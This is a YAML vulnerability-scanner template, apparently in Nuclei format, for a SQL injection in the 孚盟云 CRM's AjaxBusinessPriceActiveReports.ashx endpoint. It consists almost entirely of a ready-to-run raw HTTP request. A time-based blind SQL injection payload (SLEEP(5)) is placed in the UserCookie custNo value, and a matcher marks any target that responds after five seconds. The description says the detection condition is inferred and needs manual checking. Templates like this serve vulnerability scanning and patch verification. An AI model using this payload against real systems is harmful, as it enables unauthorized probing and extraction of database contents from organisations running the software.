id: poc-iu05y2g0wlkzvc73
info:
  name: 孚盟云AjaxBusinessPriceActiveReports存在SQLl注入漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2026
http:
- raw:
  - 'POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1

    Host: {{Hostname}}

    Cookie: UserCookie={"custNo":"1'') AND (SELECT 4920 FROM (SELECT(SLEEP(5)))ILaK)-- -"}

    Content-Type: application/x-www-form-urlencoded

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9


    action=GetTempelateList'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
